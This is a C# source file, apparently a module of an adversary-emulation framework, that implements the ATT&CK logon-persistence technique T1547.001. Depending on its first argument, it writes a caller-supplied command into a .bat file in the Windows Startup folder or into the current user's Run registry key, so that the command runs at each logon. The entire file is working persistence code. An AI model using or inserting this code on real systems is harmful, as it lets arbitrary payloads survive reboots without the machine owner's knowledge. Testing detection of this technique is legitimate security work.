using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

class Technique {

	public static Dictionary<string, string> EntryData { get; set; }
	public static Dictionary<string, string> ExitData { get; set; } 

	public static void Main(string[] args) {
		ExitData = new Dictionary<string, string>();
		string returnMessage = "";
		string returnCode = "1";
		string payloadName = args.Length >= 3 ? args[2] : "T1547-001";

		try {

			if(args[0] == "startup") {

				Console.WriteLine("Will be adding file to: " + Environment.GetFolderPath(Environment.SpecialFolder.Startup));
				try {
					string fileName = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + payloadName + ".bat";
					Console.WriteLine(fileName);
					FileInfo fi = new FileInfo(fileName);

					if (fi.Exists) {
						fi.Delete();
					}
   
					using (StreamWriter sw = fi.CreateText()) {
						sw.WriteLine(args[1]);
					}

					using (StreamReader sr = File.OpenText(fileName)) {
						string s = "";
						while ((s = sr.ReadLine()) != null) {
							Console.WriteLine(s);
						}
					}
				}
				catch (Exception Ex) {
					Console.WriteLine(Ex.ToString());
				}

			} else if (args[0] == "registry") {

				try {
				
					RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
					key.SetValue(payloadName, args[1]);
					if((string)key.GetValue(payloadName) == args[1]) {
						Console.WriteLine("[T1547-001] Succesfully set new RUN Registry with " + payloadName + " to " + args[1]);
						returnCode = "0";
					}
					key.Close();
				} catch (Exception ex) {
					Console.WriteLine("[T1547-001] Error trying to set registry - " + ex.Message);
				}
				
			}

			ExitData["returnmessage"] = returnMessage;
			ExitData["returncode"] = returnCode;

		}
		catch (Exception e) {
			Console.WriteLine("[T1547-001] Error: " + e.Message);
		}
		
	
	}
}

